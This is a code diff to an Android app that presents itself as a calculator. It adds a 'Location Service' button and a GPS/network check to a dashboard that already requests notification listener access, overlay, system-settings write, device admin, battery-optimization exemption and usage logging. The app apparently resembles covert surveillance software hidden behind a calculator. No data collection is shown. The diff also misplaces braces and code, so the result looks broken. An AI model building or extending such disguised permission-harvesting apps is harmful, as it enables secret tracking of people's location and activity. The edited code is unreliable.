@@ -1,5 +1,6 @@
 package com.android.mycalculator
 
+import android.provider.Settings
 import android.Manifest
 import android.app.AlarmManager
 import android.app.AppOpsManager
@@ -54,6 +55,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var containerUsage: LinearLayout
     private lateinit var btnTabUsage: Button        
     private lateinit var usageLogTextView: TextView 
+    private lateinit var btnPermLocationService: Button
     // Calculator Variables
     private lateinit var display: TextView
     private var isCalculated = false
@@ -268,6 +270,7 @@ class MainActivity : AppCompatActivity() {
         btnAdmin = findViewById(R.id.btnAdmin)
         btnStartServices = findViewById(R.id.btnStartServices)
         btnPermLocation = findViewById(R.id.btnPermLocation)
+        btnPermLocationService = findViewById(R.id.btnPermLocationService)
         btnPermNotif.setOnClickListener { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
         
         btnPermOverlay.setOnClickListener {
@@ -285,6 +288,9 @@ class MainActivity : AppCompatActivity() {
             1002
         )
     }
+}
+        btnPermLocationService.setOnClickListener {
+    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
 }
         btnPermWrite.setOnClickListener {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -383,10 +389,13 @@ class MainActivity : AppCompatActivity() {
     private fun updateDashboardUI() {
         val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
         updateBtn(btnPermNotif, notifEnabled, "Notification Access")
-
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+val isLocationServiceEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || 
+                               locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
+updateBtn(btnPermLocationService, isLocationServiceEnabled, "Location Service")
         val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
         updateBtn(btnPermOverlay, overlayEnabled, "Display Over Other Apps")
-
+        
         val writeEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true
         updateBtn(btnPermWrite, writeEnabled, "Modify System Settings")
 
@@ -411,11 +420,12 @@ val locationCoarseGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) 
 val locationGranted = locationFineGranted || locationCoarseGranted
 updateBtn(btnPermLocation, locationGranted, "Location Permission")
         
-        val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
-        } else true
-        updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")
-
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+    powerManager.isIgnoringBatteryOptimizations(packageName)
+} else true
+updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")
+        
         val alarmEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             (getSystemService(Context.ALARM_SERVICE) as AlarmManager).canScheduleExactAlarms()
         } else true
